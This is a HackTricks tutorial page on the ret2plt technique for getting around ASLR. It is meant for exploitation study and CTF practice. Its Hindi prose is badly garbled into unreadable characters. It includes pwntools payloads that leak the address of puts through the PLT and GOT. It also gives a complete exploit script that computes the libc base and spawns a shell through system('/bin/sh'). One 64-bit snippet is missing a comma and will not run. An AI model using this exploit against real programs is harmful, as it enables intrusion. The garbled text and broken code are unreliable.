# Ret2plt

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks swag**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣ **The PEASS Family** рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рд╣рдореЗрдВ **Twitter** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ** рджреНрд╡рд╛рд░рд╛ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВред

</details>

## рдореМрд▓рд┐рдХ рдЬрд╛рдирдХрд╛рд░реА

рдЗрд╕ рддрдХрдиреАрдХ рдХрд╛ рдЙрджреНрджреЗрд╢реНрдп рд╣реЛрдЧрд╛ рдХрд┐рд╕реА **PLT рд╕реЗ рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдкрддрд╛ рд▓реАрдХ рдХрд░рдирд╛** рддрд╛рдХрд┐ ASLR рдХреЛ рдЙрдореНрдореАрдж рд╕реЗ рднреА рдЖрдЧреЗ рдмрдврд╝рд╛ рд╕рдХреЗрдВред рдпрд╣ рдЗрд╕рд▓рд┐рдП рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдпрджрд┐ рдЖрдк, рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, `puts` рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдкрддрд╛ libc рд╕реЗ рд▓реАрдХ рдХрд░рддреЗ рд╣реИрдВ, рддреЛ рдлрд┐рд░ рдЖрдк **`libc` рдХрд╛ рдмреЗрд╕ рдХрд╣рд╛рдБ рд╣реИ рдФрд░ рдЕрдиреНрдп рдлрд╝рдВрдХреНрд╢рдиреЛрдВ рддрдХ рдкрд╣реБрдБрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рдСрдлрд╕реЗрдЯ рдХреА рдЧрдгрдирд╛** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬреИрд╕реЗ рдХрд┐ **`system`**ред

рдпрд╣ `pwntools` payload рдХреЗ рд╕рд╛рде рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдЬреИрд╕реЗ ([**рдпрд╣рд╛рдБ рд╕реЗ**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/plt\_and\_got)):
```python
# 32-bit ret2plt
payload = flat(
b'A' * padding,
elf.plt['puts'],
elf.symbols['main'],
elf.got['puts']
)

# 64-bit
payload = flat(
b'A' * padding,
POP_RDI,
elf.got['puts']
elf.plt['puts'],
elf.symbols['main']
)
```
рдиреЛрдЯ рдХрд░реЗрдВ рдХрд┐ **`puts`** (PLT рд╕реЗ рдкрддреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ) `GOT` рдореЗрдВ рд╕реНрдерд┐рдд `puts` рдХреЗ рдкрддреЗ рдХреЗ рд╕рд╛рде рдХреЙрд▓ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдпрд╣ рдЗрд╕рд▓рд┐рдП рд╣реИ рдХреНрдпреЛрдВрдХрд┐ `puts` рдЬрдм `GOT` рдкреНрд░рд┐рдВрдЯ рдХрд░рддрд╛ рд╣реИ, рддреЛ рдЗрд╕ **рдПрдВрдЯреНрд░реА рдореЗрдВ `puts` рдХрд╛ рдкрддрд╛ рдореЗрдореЛрд░реА рдореЗрдВ рд╣реЛрдЧрд╛**ред

рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рдореЗрдВ `main` рдХрд╛ рдкрддрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдЬрдм `puts` рдЕрдкрдирд╛ рдХрд╛рд░реНрдп рд╕рдорд╛рдкреНрдд рдХрд░рддрд╛ рд╣реИ, рддреЛ **рдмрд╛рдЗрдирд░реА `main` рдХреЛ рдмрдВрдж рдХрд░рдиреЗ рдХреА рдмрдЬрд╛рдп рдлрд┐рд░ рд╕реЗ рдХреЙрд▓ рдХрд░рддрд╛ рд╣реИ** (рддрд╛рдХрд┐ рд▓реАрдХ рд╣реБрдЖ рдкрддрд╛ рд╡реИрдз рд░рд╣реЗ)ред

{% hint style="danger" %}
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдЗрд╕ рдХрд╛рдо рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **рдмрд╛рдЗрдирд░реА рдХреЛ PIE рдХреЗ рд╕рд╛рде рдХрдВрдкрд╛рдЗрд▓ рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛** рдпрд╛ рдЖрдкрдХреЛ `PLT`, `GOT` рдФрд░ `main` рдХреЗ рдкрддреЗ рдХрд╛ рдкрддрд╛ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП PIE рдХреЛ рдмрд╛рдЗрдкрд╛рд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рд▓реАрдХ рдкрд╛рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдПред
{% endhint %}

рдЖрдк рдпрд╣рд╛рдБ [**рдЗрд╕ рдмрд╛рдЗрдкрд╛рд╕ рдХрд╛ рдкреВрд░рд╛ рдЙрджрд╛рд╣рд░рдг рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/ret2plt-aslr-bypass)ред рдпрд╣ рдЙрд╕ рдЙрджрд╛рд╣рд░рдг рд╕реЗ рдЕрдВрддрд┐рдо рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рдерд╛:
```python
from pwn import *

elf = context.binary = ELF('./vuln-32')
libc = elf.libc
p = process()

p.recvline()

payload = flat(
'A' * 32,
elf.plt['puts'],
elf.sym['main'],
elf.got['puts']
)

p.sendline(payload)

puts_leak = u32(p.recv(4))
p.recvlines(2)

libc.address = puts_leak - libc.sym['puts']
log.success(f'LIBC base: {hex(libc.address)}')

payload = flat(
'A' * 32,
libc.sym['system'],
libc.sym['exit'],
next(libc.search(b'/bin/sh\x00'))
)

p.sendline(payload)

p.interactive()
```
## рдЕрдиреНрдп рдЙрджрд╛рд╣рд░рдг рдФрд░ рд╕рдВрджрд░реНрдн

* [https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html)
* 64 рдмрд┐рдЯ, ASLR рд╕рдХреНрд╖рдо рд╣реИ рд▓реЗрдХрд┐рди PIE рдирд╣реАрдВ рд╣реИ, рдкрд╣рд▓рд╛ рдХрджрдо рд╣реИ рдХрд┐ рдХреИрдирд░реА рдХреЗ 0x00 рдмрд╛рдЗрдЯ рддрдХ рдУрд╡рд░рдлреНрд▓реЛ рднрд░реЗрдВ рдФрд░ рдлрд┐рд░ puts рдХреЛ рдХреЙрд▓ рдХрд░реЗрдВ рдФрд░ рдЗрд╕реЗ рд▓реАрдХ рдХрд░реЗрдВред рдХреИрдирд░реА рдХреЗ рд╕рд╛рде рдПрдХ ROP рдЧреИрдЬреЗрдЯ рдмрдирд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдЬрд┐рд╕рд╕реЗ puts рдХреЛ рдХреЙрд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП GOT рд╕реЗ puts рдХрд╛ рдкрддрд╛ рд▓реАрдХ рд╣реЛрддрд╛ рд╣реИ рдФрд░ рдлрд┐рд░ `system('/bin/sh')` рдХреЛ рдХреЙрд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ ROP рдЧреИрдЬреЗрдЯред
* [https://guyinatuxedo.github.io/08-bof\_dynamic/fb19\_overfloat/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/fb19\_overfloat/index.html)
* 64 рдмрд┐рдЯ, ASLR рд╕рдХреНрд╖рдо, рдХреЛрдИ рдХреИрдирд░реА рдирд╣реАрдВ, рдореБрдЦреНрдп рд╕реНрдЯреИрдХ рд╕реЗ рдУрд╡рд░рдлреНрд▓реЛ, рдПрдХ рдЪрд╛рдЗрд▓реНрдб рдлрд╝рдВрдХреНрд╢рди рд╕реЗред puts рдХреЛ рдХреЙрд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП ROP рдЧреИрдЬреЗрдЯ рдЬрд┐рд╕рд╕реЗ GOT рд╕реЗ puts рдХрд╛ рдкрддрд╛ рд▓реАрдХ рд╣реЛрддрд╛ рд╣реИ рдФрд░ рдлрд┐рд░ рдПрдХ рд╡рди рдЧреИрдЬреЗрдЯ рдХреЛ рдХреЙрд▓ рдХрд░реЗрдВред
